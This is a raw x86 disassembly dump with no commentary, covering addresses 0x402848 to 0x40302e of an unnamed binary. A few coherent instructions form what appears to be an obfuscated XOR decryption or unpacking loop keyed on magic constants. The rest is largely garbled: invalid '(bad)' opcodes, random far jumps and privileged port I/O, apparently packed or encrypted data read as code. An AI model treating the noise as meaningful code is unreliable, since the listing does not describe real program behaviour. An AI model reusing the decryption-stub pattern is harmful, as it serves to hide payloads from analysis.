  402848:	mov    eax,ds:0xad7d2a4d
  40284d:	arpl   WORD PTR [esi-0x7e861c8f],di
  402853:	or     BYTE PTR [esi-0x389f8ae4],bl
  402859:	add    eax,0x42e7de
  40285e:	adc    al,0x0
  402860:	add    BYTE PTR [eax],al
  402862:	cmp    DWORD PTR ds:0x42e7de,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e7de,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42ea58
  402885:	cmp    DWORD PTR ds:0x42e7de,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e7de
  40289a:	dec    eax
  40289b:	mov    ds:0x42e7de,eax
  4028a0:	mov    eax,ds:0x42e7de
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e7de,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	fstp   TBYTE PTR [esi+0x3e691ea]
  4028e6:	jle    0x402966
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	mov    DWORD PTR [edx-0x481cedf2],eax
  4028f2:	xor    esi,DWORD PTR [ebp-0x3ed7ab93]
  4028f8:	add    edi,DWORD PTR ds:0x4bdacc66
  4028fe:	cld    
  4028ff:	xchg   esp,eax
  402900:	jle    0x402885
  402902:	mov    ecx,0x19a0277c
  402908:	dec    ebp
  402909:	shr    DWORD PTR [ebp+0x10f031db],cl
  40290f:	loope  0x4028fb
  402911:	outs   dx,DWORD PTR ds:[esi]
  402912:	mov    edi,0x5a231362
  402917:	pop    es
  402918:	and    DWORD PTR [edi+ecx*2-0xf8f0c8a],edi
  40291f:	xor    al,0x2a
  402921:	jmp    0x750f:0x412b2d6d
  402928:	lea    ecx,[ecx-0x49]
  40292b:	fsub   DWORD PTR [ecx]
  40292d:	test   BYTE PTR [edx],0x1f
  402930:	stc    
  402931:	pop    ebx
  402932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402933:	aaa    
  402934:	sub    BYTE PTR [eax],al
  402936:	into   
  402937:	jne    0x40298b
  402939:	popf   
  40293a:	and    esi,esi
  40293c:	xchg   edi,eax
  40293d:	das    
  40293e:	clc    
  40293f:	sbb    ch,BYTE PTR [eax]
  402941:	mov    ebp,ebp
  402943:	stos   BYTE PTR es:[edi],al
  402944:	push   ds
  402945:	inc    eax
  402946:	fs out dx,al
  402948:	adc    DWORD PTR ss:[eax+0x7f],edi
  40294c:	jb     0x402954
  40294e:	outs   dx,DWORD PTR ds:[esi]
  40294f:	jle    0x4028f4
  402951:	enter  0xe6ec,0xe6
  402955:	jmp    0x6449d41a
  40295a:	pushf  
  40295b:	in     eax,dx
  40295c:	cmp    ebp,ebp
  40295e:	mov    bh,0x74
  402960:	rcl    BYTE PTR [eax+0x315f8f6d],0x12
  402967:	inc    eax
  402968:	mov    bl,0x73
  40296a:	and    al,0x92
  40296c:	or     eax,0xff067665
  402971:	ds leave 
  402973:	aad    0x8d
  402975:	cld    
  402976:	xchg   DWORD PTR [edx+0x4b3486fc],esp
  40297c:	mov    bl,ch
  40297e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40297f:	push   ecx
  402980:	mov    bh,0xad
  402982:	mov    ecx,0xdcc2bafe
  402987:	mov    ah,0xd3
  402989:	cwde   
  40298a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40298b:	or     edx,DWORD PTR ds:0xcc45a91
  402991:	inc    ecx
  402992:	mov    dl,0xa
  402994:	push   ecx
  402995:	xor    BYTE PTR [ebx],ah
  402997:	pop    ebp
  402998:	std    
  402999:	mov    eax,0x6e4aa283
  40299e:	push   ds
  40299f:	fld    TBYTE PTR [esi+esi*4+0x2b1de5b9]
  4029a6:	sub    dl,BYTE PTR [edi-0x271794c0]
  4029ac:	cmp    eax,0x330b7423
  4029b1:	shl    BYTE PTR [esi-0x162d36c6],cl
  4029b7:	in     eax,dx
  4029b8:	out    0xbc,eax
  4029ba:	or     eax,0x11873a5b
  4029bf:	lods   eax,DWORD PTR cs:[esi]
  4029c1:	dec    esi
  4029c2:	mov    cl,0xa3
  4029c4:	add    eax,0x4336533d
  4029c9:	cmc    
  4029ca:	ins    DWORD PTR es:[edi],dx
  4029cb:	push   esp
  4029cc:	jp     0x402a39
  4029ce:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029d0:	gs pushf 
  4029d2:	and    DWORD PTR [ebp+0x7c],esi
  4029d5:	mov    edx,0x1369cd60
  4029da:	fisttp WORD PTR [edx+ecx*1+0x70]
  4029de:	jmp    0xed7d4ff6
  4029e3:	mov    al,ds:0x60c5f90e
  4029e8:	mov    BYTE PTR [ebx+0x49],0x58
  4029ec:	xchg   ecx,eax
  4029ed:	pop    esp
  4029ee:	and    DWORD PTR [edi+edi*4+0x12],edi
  4029f2:	out    dx,eax
  4029f3:	xor    DWORD PTR [eax+0x3976e4b],esp
  4029f9:	daa    
  4029fa:	push   ecx
  4029fb:	ret    
  4029fc:	sti    
  4029fd:	ret    0x55e2
  402a00:	std    
  402a01:	in     al,dx
  402a02:	xchg   edx,eax
  402a03:	push   esi
  402a04:	mov    eax,ss:0xd795e6ae
  402a0a:	out    0xa0,eax
  402a0c:	test   BYTE PTR [ebp+eax*2+0x5120ca24],0x3c
  402a14:	xor    BYTE PTR [eax+0x128d74ed],dh
  402a1a:	repz loope 0x4029d2
  402a1d:	(bad)  
  402a1e:	aam    0x85
  402a20:	adc    bh,BYTE PTR [ebp+0x4d]
  402a23:	cmp    ch,ch
  402a25:	pop    ds
  402a26:	hlt    
  402a27:	cwde   
  402a28:	popa   
  402a29:	sbb    BYTE PTR [ebx+0x23],ah
  402a2c:	dec    esi
  402a2d:	mov    dl,0xec
  402a2f:	ror    DWORD PTR [ebx],cl
  402a31:	inc    ebp
  402a32:	add    DWORD PTR [edi],esp
  402a34:	sti    
  402a35:	push   es
  402a36:	mov    esi,0x158c27c4
  402a3b:	add    al,0x1e
  402a3d:	js     0x4029ea
  402a3f:	add    cl,BYTE PTR [edx+0x75]
  402a42:	dec    eax
  402a43:	outs   dx,DWORD PTR ds:[esi]
  402a44:	je     0x402aa4
  402a46:	(bad)  
  402a47:	xchg   ebx,eax
  402a48:	cmp    DWORD PTR [edi],esp
  402a4a:	popf   
  402a4b:	xlat   BYTE PTR ds:[ebx]
  402a4c:	fidiv  WORD PTR [ebp+0x4]
  402a4f:	xchg   ebx,esp
  402a51:	jge    0x402a82
  402a53:	fistp  QWORD PTR [esi-0x4ea7a99c]
  402a59:	inc    esi
  402a5a:	fld    st(3)
  402a5c:	inc    esi
  402a5d:	fisub  DWORD PTR [esi+edx*1+0x47]
  402a61:	sbb    BYTE PTR [edi],al
  402a63:	xchg   ecx,eax
  402a64:	or     al,0x2a
  402a66:	lods   eax,DWORD PTR ds:[esi]
  402a67:	jae    0x402a67
  402a69:	xor    DWORD PTR [ebp-0x5225e880],ebx
  402a6f:	jnp    0x402acc
  402a71:	xor    eax,0x1ae06aa9
  402a76:	mov    esp,0xce038afd
  402a7b:	mov    ah,0x68
  402a7d:	cs jg  0x402aed
  402a80:	sub    eax,0x2c8d433
  402a85:	test   BYTE PTR [ebx+0x18d2dc4e],0x71
  402a8c:	inc    ecx
  402a8d:	addr16 inc ebx
  402a8f:	dec    esi
  402a90:	lea    eax,[edi]
  402a92:	(bad)  
  402a93:	retf   0xe29d
  402a96:	shl    DWORD PTR [esi+0x25],0xd8
  402a9a:	(bad)  
  402a9b:	push   cs
  402a9c:	fwait
  402a9d:	or     cl,BYTE PTR [ecx-0x65c6f993]
  402aa3:	cli    
  402aa4:	icebp  
  402aa5:	in     eax,0xd4
  402aa7:	push   edx
  402aa8:	or     al,cl
  402aaa:	ret    
  402aab:	sbb    dl,BYTE PTR [eax]
  402aad:	pusha  
  402aae:	inc    esp
  402aaf:	leave  
  402ab0:	adc    al,BYTE PTR [edi-0x2d]
  402ab3:	push   ebx
  402ab4:	hlt    
  402ab5:	dec    ebp
  402ab6:	mov    ah,cl
  402ab8:	jg     0x402aac
  402aba:	stos   BYTE PTR es:[edi],al
  402abb:	jbe    0x402a99
  402abd:	inc    esi
  402abe:	jmp    0x402ac2
  402ac0:	mov    cs,WORD PTR [eax+0x68]
  402ac3:	dec    eax
  402ac4:	div    BYTE PTR [ebx]
  402ac6:	and    esp,ebp
  402ac8:	jl     0x402aab
  402aca:	ret    
  402acb:	add    al,0xb8
  402acd:	out    dx,al
  402ace:	jbe    0x402aeb
  402ad0:	data16 or ch,dh
  402ad3:	pop    ss
  402ad4:	xchg   ebx,eax
  402ad5:	mov    eax,ds:0x6a802132
  402ada:	mov    edi,0x415ba975
  402adf:	fcmovbe st,st(7)
  402ae1:	push   cs
  402ae2:	push   es
  402ae3:	in     al,0x23
  402ae5:	pop    ecx
  402ae6:	jbe    0x402a97
  402ae8:	divps  xmm4,XMMWORD PTR [eax+0x42a13ecc]
  402aef:	jl     0x402b3d
  402af1:	mov    esp,0x656f0252
  402af6:	sub    al,0xb6
  402af8:	pop    ds
  402af9:	push   cs
  402afa:	aad    0xad
  402afc:	sbb    eax,0x222d1f0f
  402b01:	mov    al,0xe0
  402b03:	sub    DWORD PTR [esi],ebp
  402b05:	in     eax,0xd5
  402b07:	jle    0x402a89
  402b09:	xchg   BYTE PTR [ebx],ah
  402b0b:	jnp    0x402b7d
  402b0d:	push   eax
  402b0e:	mov    cl,0x5c
  402b10:	or     ch,0xcb
  402b13:	or     bh,dl
  402b15:	out    dx,al
  402b16:	clc    
  402b17:	inc    edx
  402b18:	pop    esi
  402b19:	mov    edi,0x6b90eaac
  402b1e:	daa    
  402b1f:	in     al,dx
  402b20:	xchg   ebx,eax
  402b21:	dec    edx
  402b22:	mov    BYTE PTR [esi-0x1c],ah
  402b25:	fmulp  st(7),st
  402b27:	mov    bh,0x6a
  402b29:	xchg   esi,eax
  402b2a:	lds    edx,FWORD PTR [edx+edi*4+0x1c]
  402b2e:	(bad)  
  402b2f:	repz retf 0x1586
  402b33:	addr16 rcr bl,1
  402b36:	out    0x3c,al
  402b38:	(bad)  [esi-0x44cada51]
  402b3e:	and    cl,cl
  402b40:	jge    0x402aed
  402b42:	push   ecx
  402b43:	sbb    BYTE PTR ds:0xa6162781,dl
  402b49:	dec    eax
  402b4a:	mov    al,ds:0x187287b3
  402b4f:	lods   eax,DWORD PTR ds:[esi]
  402b50:	stos   BYTE PTR es:[edi],al
  402b51:	adc    al,0x64
  402b53:	scas   eax,DWORD PTR es:[edi]
  402b54:	add    eax,0x19bb391d
  402b59:	jmp    FWORD PTR [ecx-0x78]
  402b5c:	addr16 and eax,0xa2393cb9
  402b62:	sbb    al,bh
  402b64:	out    dx,eax
  402b65:	sbb    edi,DWORD PTR [eax-0x1a]
  402b68:	pop    ss
  402b69:	pop    ecx
  402b6a:	icebp  
  402b6b:	ja     0x402bdd
  402b6d:	inc    eax
  402b6e:	xor    al,0x7b
  402b70:	push   cs
  402b71:	std    
  402b72:	cmp    DWORD PTR [ecx-0x62],esi
  402b75:	jl     0x402ba3
  402b77:	pop    es
  402b78:	sysexit 
  402b7a:	jge    0x402b34
  402b7c:	scas   eax,DWORD PTR es:[edi]
  402b7d:	call   0x32b0f434
  402b82:	mov    ebx,0x7a6a5dd2
  402b87:	(bad)  
  402b89:	fild   WORD PTR [ebp+0x60]
  402b8c:	xor    DWORD PTR [ebx-0x1f],0xfffffff1
  402b90:	jle    0x402b7d
  402b92:	mov    al,0xa7
  402b94:	jge    0x402bb6
  402b96:	repz dec esi
  402b98:	rcl    BYTE PTR [edi+0x50ea5baa],cl
  402b9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b9f:	fld    TBYTE PTR [edx]
  402ba1:	loope  0x402b37
  402ba3:	cld    
  402ba4:	sahf   
  402ba5:	pop    es
  402ba6:	ret    
  402ba7:	icebp  
  402ba8:	push   ebx
  402ba9:	pop    es
  402baa:	or     BYTE PTR [eax+esi*8-0x49],al
  402bae:	neg    DWORD PTR [ebp+0x3ebbeea8]
  402bb4:	pop    ss
  402bb5:	iret   
  402bb6:	cld    
  402bb7:	jnp    0x402b93
  402bb9:	or     al,BYTE PTR [ecx-0x22992bba]
  402bbf:	sub    al,0x8d
  402bc1:	outs   dx,DWORD PTR ds:[esi]
  402bc2:	call   0xa147dfc5
  402bc7:	cwde   
  402bc8:	dec    edx
  402bc9:	arpl   WORD PTR [ecx-0x4050563e],di
  402bcf:	mov    edx,0x1581f398
  402bd4:	icebp  
  402bd5:	mov    bh,ah
  402bd7:	dec    ebx
  402bd8:	or     BYTE PTR [ebx+0x32],0x5b
  402bdc:	pop    es
  402bdd:	stos   BYTE PTR es:[edi],al
  402bde:	adc    DWORD PTR [ecx-0x5c],edi
  402be1:	adc    edx,DWORD PTR [esi+0x6a]
  402be4:	mov    ds:0x7a0c652,eax
  402be9:	push   esp
  402bea:	sub    DWORD PTR [esi+0x24],esp
  402bed:	cmp    ebp,ebx
  402bef:	push   0x495c4f7e
  402bf4:	mov    esi,0xc1417e9e
  402bf9:	add    DWORD PTR [edx+0xe0e0c14],0x71
  402c00:	jae    0x402c62
  402c02:	xchg   DWORD PTR [ecx],ecx
  402c04:	inc    ebp
  402c05:	test   DWORD PTR [ebx],esi
  402c07:	repz jae 0x402c32
  402c0a:	aad    0xc3
  402c0c:	mov    al,BYTE PTR [ebx+0x2d]
  402c0f:	jle    0x402bd4
  402c11:	retf   0xb6bf
  402c14:	sub    al,0x1a
  402c16:	xor    eax,0x987284fc
  402c1b:	inc    ecx
  402c1c:	dec    edx
  402c1d:	jge    0x402c8b
  402c1f:	mov    esp,esi
  402c21:	jmp    0x3641477d
  402c26:	daa    
  402c27:	repnz jecxz 0x402bb0
  402c2a:	leave  
  402c2b:	jg     0x402bed
  402c2d:	pop    ds
  402c2e:	out    dx,eax
  402c2f:	jbe    0x402c96
  402c31:	daa    
  402c32:	les    edx,FWORD PTR [ebx+0x71]
  402c35:	inc    esi
  402c36:	jg     0x402c4f
  402c38:	add    bl,0x45
  402c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c3c:	mov    ss,WORD PTR [edi+eiz*1-0x10736162]
  402c43:	adc    BYTE PTR [ecx],al
  402c45:	retf   0xa3f7
  402c48:	adc    WORD PTR [ebx+0x7f],bp
  402c4c:	pushf  
  402c4d:	push   esp
  402c4e:	je     0x402c37
  402c50:	cwde   
  402c51:	out    0x40,eax
  402c53:	sub    DWORD PTR [ecx],0x69
  402c56:	fs pop ebp
  402c58:	lock mov esp,0xebc9c47d
  402c5e:	sub    al,0x54
  402c60:	jbe    0x402c98
  402c62:	mov    cl,0x64
  402c64:	mov    BYTE PTR [esi+eiz*2+0x48],bh
  402c68:	pop    ebx
  402c69:	push   esp
  402c6a:	inc    ebx
  402c6b:	cmc    
  402c6c:	xlat   BYTE PTR ds:[ebx]
  402c6d:	ja     0x402bf0
  402c6f:	dec    ebp
  402c70:	cdq    
  402c71:	and    bh,0x77
  402c74:	push   edi
  402c75:	and    eax,0xdc5acdef
  402c7a:	cld    
  402c7b:	mov    dl,0x69
  402c7d:	adc    eax,DWORD PTR [edi]
  402c7f:	in     eax,0x8b
  402c81:	inc    ebp
  402c82:	lock and DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	xor    esi,DWORD PTR [ebx+0x70af40e]
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	sub    al,0xc8
  402cce:	jnp    0x402d1d
  402cd0:	cmp    BYTE PTR [edi],cl
  402cd2:	mov    eax,DWORD PTR [ebp+eiz*4+0x562957e6]
  402cd9:	push   ss
  402cda:	mov    dl,0x65
  402cdc:	in     eax,dx
  402cdd:	jo     0x402c99
  402cdf:	mov    al,0x1d
  402ce1:	stos   DWORD PTR es:[edi],eax
  402ce2:	sub    esp,DWORD PTR ds:0x623d56bf
  402ce8:	in     eax,dx
  402ce9:	sbb    BYTE PTR [ebx-0x4fb01de0],ah
  402cef:	dec    edx
  402cf0:	(bad)  
  402cf3:	iret   
  402cf4:	je     0x402d56
  402cf6:	or     BYTE PTR [edi+0x5f],ch
  402cf9:	dec    edx
  402cfa:	pushf  
  402cfb:	cmp    eax,0xc1ee3792
  402d00:	test   al,0x5d
  402d02:	mov    esi,0x6bd8ebaa
  402d07:	icebp  
  402d08:	out    0x46,eax
  402d0a:	xchg   ebp,eax
  402d0b:	cmp    ebp,DWORD PTR [ebx+edi*1]
  402d0e:	frstor [ebx-0x42]
  402d11:	gs inc ecx
  402d13:	out    0xbc,al
  402d15:	dec    esp
  402d16:	fs jmp esp
  402d19:	jnp    0x402d1f
  402d1b:	lahf   
  402d1c:	rol    DWORD PTR [edx+ebx*2+0x6a0ce351],0xc8
  402d24:	mov    al,0xa7
  402d26:	fwait
  402d27:	mov    ebp,0xe8da7a06
  402d2c:	pop    eax
  402d2d:	sub    dh,ah
  402d2f:	sbb    DWORD PTR [ebp-0x5d24fdbb],edx
  402d35:	jmp    0x7b15:0xcd8787b7
  402d3c:	inc    ebx
  402d3d:	cmc    
  402d3e:	outs   dx,DWORD PTR ds:[esi]
  402d3f:	das    
  402d40:	pop    ebx
  402d41:	jg     0x402cd2
  402d43:	push   es
  402d44:	in     al,0xd
  402d46:	test   BYTE PTR [ebx+0x44],al
  402d49:	sbb    al,dl
  402d4b:	popf   
  402d4c:	xchg   BYTE PTR [edx+0x57],bh
  402d4f:	jl     0x402dca
  402d51:	mov    eax,ds:0xc70c6987
  402d56:	xchg   ebx,eax
  402d57:	adc    dl,dh
  402d59:	inc    edi
  402d5a:	push   esp
  402d5b:	lahf   
  402d5c:	push   edx
  402d5d:	inc    ebp
  402d5e:	add    al,0x1e
  402d60:	stos   DWORD PTR es:[edi],eax
  402d61:	mov    bh,0xe8
  402d63:	ja     0x402dbd
  402d65:	mov    ah,0x81
  402d67:	test   DWORD PTR [ebx],0xc374a977
  402d6d:	adc    edx,edx
  402d6f:	fs icebp 
  402d71:	int3   
  402d72:	mov    ds:0x88000c62,al
  402d77:	push   eax
  402d78:	push   0x40
  402d7a:	imul   esi,ebx,0xd0c4e04c
  402d80:	cdq    
  402d81:	mov    dh,0xe9
  402d83:	add    DWORD PTR [eax+0x45b74b89],ebp
  402d89:	push   ecx
  402d8a:	cmp    eax,0x99fd844e
  402d8f:	xchg   ecx,eax
  402d90:	retf   0x69a
  402d93:	pop    edx
  402d94:	push   esp
  402d95:	push   es
  402d96:	mov    al,0x89
  402d98:	xchg   edx,eax
  402d99:	inc    esi
  402d9a:	jns    0x402dcf
  402d9c:	push   0xd811602f
  402da1:	test   eax,0xffdffa31
  402da6:	(bad)  
  402da7:	xchg   edx,eax
  402da8:	aas    
  402da9:	and    cl,BYTE PTR [ebx+0x7e]
  402dac:	rcr    BYTE PTR [ebx-0x67ffdb46],1
  402db2:	stc    
  402db3:	dec    esi
  402db4:	lods   eax,DWORD PTR ds:[esi]
  402db5:	ss jb  0x402d9e
  402db8:	hlt    
  402db9:	mov    ebx,0xe8e1952
  402dbe:	pop    ebx
  402dbf:	aad    0x6f
  402dc1:	bound  edx,QWORD PTR [edx]
  402dc3:	mov    ah,0xc
  402dc5:	xor    eax,0xbfc76425
  402dca:	clc    
  402dcb:	push   0xffffff94
  402dcd:	xchg   ebx,eax
  402dce:	adc    ch,BYTE PTR [ecx+0x5c]
  402dd1:	pop    ss
  402dd2:	adc    BYTE PTR [ecx-0x35],bl
  402dd5:	mov    ah,0xa5
  402dd7:	int3   
  402dd8:	sub    BYTE PTR gs:[ebp-0x7f],dl
  402ddc:	loope  0x402e19
  402dde:	call   0xa0db4c9b
  402de3:	sub    DWORD PTR [eax+0x79],esp
  402de6:	fadd   QWORD PTR [ecx-0x2e]
  402de9:	pop    esp
  402dea:	mov    dl,0xa8
  402dec:	mov    WORD PTR [ecx+0x31],ds
  402def:	arpl   WORD PTR [edx-0x19],bp
  402df2:	adc    eax,0xec63141e
  402df7:	pop    es
  402df8:	mov    eax,0x299bb477
  402dfd:	xor    al,0xea
  402dff:	mov    esp,0x2c7e7b21
  402e04:	imul   ebp,edi,0xffffff9b
  402e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e08:	mov    bh,0xed
  402e0a:	sbb    ebx,DWORD PTR [ebx-0x6c84186d]
  402e10:	xor    ebx,0xa957b175
  402e16:	push   0x1abadcff
  402e1b:	popf   
  402e1c:	jmp    0xd953:0x269a8660
  402e23:	jmp    0x56c1:0x7d3eaaab
  402e2a:	out    dx,eax
  402e2b:	test   eax,0xc26e932f
  402e30:	loope  0x402e7d
  402e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e33:	leave  
  402e34:	sub    DWORD PTR [ebp+eax*4+0x659810b5],edi
  402e3b:	dec    edi
  402e3c:	xor    ch,BYTE PTR [ecx+0x15fe3271]
  402e42:	adc    edx,ebp
  402e44:	xchg   bh,dl
  402e46:	test   ah,ch
  402e48:	dec    ecx
  402e49:	jo     0x402dea
  402e4b:	push   edi
  402e4c:	test   bl,0xb1
  402e4f:	mov    ch,BYTE PTR [ebx]
  402e51:	scas   al,BYTE PTR es:[edi]
  402e52:	jl     0x402e33
  402e54:	in     eax,dx
  402e55:	and    al,0x16
  402e57:	mov    esi,0x156fa4ba
  402e5c:	imul   BYTE PTR [ecx-0x503d186a]
  402e62:	aaa    
  402e63:	sahf   
  402e64:	rcl    DWORD PTR [edx-0x25744885],0x9
  402e6b:	outs   dx,BYTE PTR ds:[esi]
  402e6c:	pusha  
  402e6d:	or     eax,0x4501c241
  402e72:	xor    ch,BYTE PTR [edi+0x6aa1d695]
  402e78:	arpl   WORD PTR [ebp+0x4639dd47],bp
  402e7e:	push   cs
  402e7f:	stc    
  402e80:	push   edx
  402e81:	push   edx
  402e82:	data16 xor al,BYTE PTR [ebx-0x25]
  402e86:	mov    dh,0x2f
  402e88:	dec    edi
  402e89:	pop    esi
  402e8a:	xor    eax,0xed27278c
  402e8f:	add    al,BYTE PTR [esi-0x7430abf9]
  402e95:	push   0x76
  402e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e98:	or     edx,DWORD PTR [edx]
  402e9a:	pop    esi
  402e9b:	imul   edi,DWORD PTR [edi-0xd66896d],0x31d41f14
  402ea5:	pop    edx
  402ea6:	test   BYTE PTR [edi],ah
  402ea8:	xor    al,0xa
  402eaa:	jns    0x402ea4
  402eac:	sbb    ebx,DWORD PTR [ebp-0x32e8f0bd]
  402eb2:	pushf  
  402eb3:	shl    BYTE PTR [esi+0x41d3564a],0x51
  402eba:	sti    
  402ebb:	sbb    bl,BYTE PTR [ebp+0x27da66de]
  402ec1:	gs ds push ebx
  402ec4:	and    BYTE PTR [ecx-0x22],cl
  402ec7:	add    eax,DWORD PTR [eax+0x2e]
  402eca:	pop    ss
  402ecb:	dec    edi
  402ecc:	xchg   BYTE PTR [ebx+0x2f],al
  402ecf:	ret    
  402ed0:	les    ecx,FWORD PTR [ebp+0x3abbb983]
  402ed6:	xchg   esi,eax
  402ed7:	push   eax
  402ed8:	inc    esi
  402ed9:	stos   DWORD PTR es:[edi],eax
  402eda:	xor    BYTE PTR [edx+0x46],ch
  402edd:	or     ch,BYTE PTR [ecx]
  402edf:	addr16 sar dh,cl
  402ee2:	xchg   esi,eax
  402ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee4:	fld    DWORD PTR [edx-0x5320dcd]
  402eea:	inc    ebx
  402eeb:	in     eax,dx
  402eec:	sbb    DWORD PTR [ecx],esp
  402eee:	fnstsw WORD PTR [edi]
  402ef0:	mov    ss,WORD PTR [esi+esi*4]
  402ef3:	imul   edx,DWORD PTR [esi],0xffffffa8
  402ef6:	jmp    0xeec201e0
  402efb:	jp     0x402f32
  402efd:	mov    dh,0xd6
  402eff:	or     BYTE PTR [eax],dl
  402f01:	in     eax,dx
  402f02:	sar    BYTE PTR [ebp+0xe8c2009],1
  402f08:	and    ch,BYTE PTR [ebx]
  402f0a:	sub    al,0x96
  402f0c:	sub    DWORD PTR [ebp-0x4],eax
  402f0f:	dec    esi
  402f10:	sub    al,0xe1
  402f12:	in     eax,dx
  402f13:	(bad)  
  402f14:	jne    0x402eb8
  402f16:	mov    edx,0xad0aac9c
  402f1b:	mov    es,WORD PTR [ecx-0x2a]
  402f1e:	push   edi
  402f1f:	cli    
  402f20:	(bad)  
  402f21:	push   edi
  402f22:	loop   0x402f2a
  402f24:	imul   edx,ebx,0xffffffbc
  402f27:	fnsave [ebx]
  402f29:	fstp   st(1)
  402f2b:	ss test eax,0x706ff832
  402f31:	out    dx,al
  402f32:	xor    eax,0x9d2e487f
  402f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f38:	out    0x59,al
  402f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f3b:	(bad)  
  402f3c:	mov    al,ds:0x138e1252
  402f41:	push   ds
  402f42:	sub    BYTE PTR [ecx+eax*4],dh
  402f45:	xor    DWORD PTR [edi],ecx
  402f47:	in     al,0x57
  402f49:	add    eax,0x4c79101e
  402f4e:	ret    0x26bc
  402f51:	sub    ch,BYTE PTR [esi+0x6cf4c1]
  402f57:	push   0x6c
  402f59:	mov    ch,0xd
  402f5b:	fidiv  DWORD PTR [edx-0x519f0bbf]
  402f61:	mov    ds:0xf3d75bda,al
  402f66:	add    ebx,DWORD PTR cs:[eax+0x73a15b21]
  402f6d:	mov    eax,0xef5d48eb
  402f72:	mov    eax,DWORD PTR [ebp-0x10]
  402f75:	jle    0x402f1b
  402f77:	les    ebp,FWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	leave  
  402f7b:	mov    bh,0xdd
  402f7d:	jmp    0x2cbc:0xa90d734c
  402f84:	push   edi
  402f85:	dec    eax
  402f86:	pop    edi
  402f87:	iret   
  402f88:	arpl   sp,bp
  402f8a:	fsubp  st(6),st
  402f8c:	popf   
  402f8d:	dec    ecx
  402f8e:	or     BYTE PTR [edx+edi*8],dh
  402f91:	and    ah,BYTE PTR [ebx+0x5c]
  402f94:	dec    eax
  402f95:	xor    al,BYTE PTR [ebp+0x17d083f0]
  402f9b:	and    eax,0xbb26f05
  402fa0:	div    DWORD PTR [eax+0x781a59f0]
  402fa6:	dec    ebx
  402fa7:	fwait
  402fa8:	mov    esi,ecx
  402faa:	call   0x53a53275
  402faf:	lock or eax,0x7aafd006
  402fb5:	mov    cl,BYTE PTR [ebx+0x52def23]
  402fbb:	test   al,0xa6
  402fbd:	pop    ecx
  402fbe:	xchg   ebx,eax
  402fbf:	xor    DWORD PTR [ecx],esi
  402fc1:	shrd   DWORD PTR [esi],ecx,cl
  402fc4:	add    al,0x43
  402fc6:	retf   
  402fc7:	(bad)  
  402fc8:	sub    DWORD PTR [edi],edi
  402fca:	mov    al,ds:0xe1b6704f
  402fcf:	(bad)  
  402fd0:	repnz mov dl,BYTE PTR [eax+0xbf19b51]
  402fd7:	js     0x402ff4
  402fd9:	or     BYTE PTR [edi+0xc],cl
  402fdc:	jg     0x403055
  402fde:	or     al,0x4b
  402fe0:	jle    0x403037
  402fe2:	sub    al,0x1c
  402fe4:	push   esi
  402fe5:	xor    al,al
  402fe7:	inc    BYTE PTR [esi]
  402fe9:	push   esi
  402fea:	mov    esi,0x4fe99f41
  402fef:	call   0x63c9b300
  402ff4:	add    al,0x95
  402ff6:	adc    al,0x68
  402ff8:	jno    0x402f90
  402ffa:	inc    ebp
  402ffb:	xchg   DWORD PTR [ebx-0x4b],edi
  402ffe:	dec    edi
  402fff:	mov    bh,0xa3
  403001:	test   al,0xa5
  403003:	(bad)  
  403004:	out    dx,eax
  403005:	dec    ebx
  403006:	push   0xffffffaa
  403008:	and    eax,0xeabb6fed
  40300d:	leave  
  40300e:	sbb    al,0xd6
  403010:	inc    eax
  403011:	cli    
  403012:	or     ah,BYTE PTR [ecx-0x4f87d946]
  403018:	jmp    0x89e06577
  40301d:	stos   BYTE PTR es:[edi],al
  40301e:	imul   edi,esi,0x30479048
  403024:	jns    0x40306b
  403026:	ret    0x70b7
  403029:	or     al,BYTE PTR [ecx]
  40302b:	lods   al,BYTE PTR ds:[esi]
  40302c:	push   esp
  40302d:	out    dx,eax
  40302e:	jmp    0x4402b108
